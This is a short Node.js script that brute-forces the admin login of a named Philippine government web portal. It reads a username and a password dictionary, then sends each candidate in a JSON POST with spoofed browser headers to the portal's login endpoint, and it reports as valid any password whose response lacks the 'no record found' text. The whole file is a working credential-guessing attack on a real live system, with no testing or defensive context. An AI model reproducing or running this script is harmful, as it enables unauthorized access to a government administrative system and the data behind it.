//Dependencies
const Request = require("request")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

//Main
if(!Self_Args.length){
    console.log("node index.js <username> <dictionary>")
    process.exit()
}

if(!Self_Args[0]){
    console.log("Invalid username.")
    process.exit()
}

if(!Self_Args[1]){
    console.log("Invalid dictionary.")
    process.exit()
}

if(!Fs.existsSync(Self_Args[1])){
    console.log("Invalid dictionary.")
    process.exit()
}

const dictionary_data = Fs.readFileSync(Self_Args[1], "utf8").split("\n")

var dictionary_index = 0

Check()
function Check(){
    if(dictionary_index == dictionary_data.length){
        console.log("Finished checking.")
        process.exit()
    }

    Request.post("https://cpdas.prc.gov.ph/admin/loginAdmin.aspx/logIn", {
        headers: {
            "Cookie": "SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1",
            "Origin": "https://cpdas.prc.gov.ph",
            "Referer": "https://cpdas.prc.gov.ph/admin/loginAdmin.aspx",
            "Content-Type": "application/json",
            "x-requested-with": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
        },
        body: JSON.stringify({ "uname": Self_Args[0], "pword": dictionary_data[dictionary_index] })
    }, function(err, res, body){
        if(body.indexOf("no record found") == -1){
            console.log(`Valid password ${dictionary_data[dictionary_index]}`)
        }else{
            console.log(`Invalid password ${dictionary_data[dictionary_index]}`)
        }

        dictionary_index += 1
        Check()
        return
    })
}
